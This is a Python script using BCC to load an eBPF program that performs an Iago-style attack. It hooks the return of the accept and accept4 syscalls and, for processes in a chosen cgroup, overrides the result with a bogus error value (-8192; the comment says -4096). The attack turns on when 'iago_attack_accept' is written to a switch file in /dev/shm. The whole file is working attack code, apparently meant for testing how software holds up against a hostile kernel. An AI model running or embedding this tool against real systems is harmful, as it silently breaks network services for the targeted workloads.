import os
import sys
import time
from bcc import BPF

if len(sys.argv) != 2:
    print("Usage: python3 script.py <target_cgroup_id>")
    sys.exit(1)

target_cgroup_id = int(sys.argv[1])

bpf_program_template = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/errno.h>

BPF_HASH(cgroup_id_map, u32, u64);

static inline bool compare_cgroup_id(u64 cgroup_id) {
    u64 current_cgroup_id = bpf_get_current_cgroup_id();
    if (cgroup_id != current_cgroup_id)
        return false;

    return true;
}

int handle_sys_accept(struct pt_regs *ctx) {
    u64 target_cgroup = %d;
    if (!compare_cgroup_id(target_cgroup))
        return 0;

    // Override syscall return value to simulate failure (-4096)
    u64 success = bpf_override_return(ctx, -8192);
    return 0;
}
"""


bpf_program = bpf_program_template % target_cgroup_id

bpf = BPF(text=bpf_program)


switch_file = "/dev/shm/switch_file"


if not os.path.exists(switch_file):
    with open(switch_file, "w") as f:
        f.write("")

print("eBPF program loaded. Monitoring /dev/shm/switch_file for commands...")

try:
    attached = False 

    while True:
        with open(switch_file, "r") as f:
            content = f.read().strip()

        if content == "iago_attack_accept" and not attached:
            print("Attaching kretprobe to sys_accept...")
            bpf.attach_kretprobe(event=bpf.get_syscall_fnname("accept"), fn_name="handle_sys_accept")
            bpf.attach_kretprobe(event=bpf.get_syscall_fnname("accept4"), fn_name="handle_sys_accept")
            attached = True
        elif content != "iago_attack_accept" and attached:
            print("Detaching kretprobe from sys_accept...")
            bpf.detach_kretprobe(event=bpf.get_syscall_fnname("accept"))
            bpf.detach_kretprobe(event=bpf.get_syscall_fnname("accept4"))
            attached = False

        time.sleep(1)
except KeyboardInterrupt:
    if attached:
        bpf.detach_kretprobe(event=bpf.get_syscall_fnname("accept"))
        bpf.detach_kretprobe(event=bpf.get_syscall_fnname("accept4"))
    print("Detaching probes and exiting...")
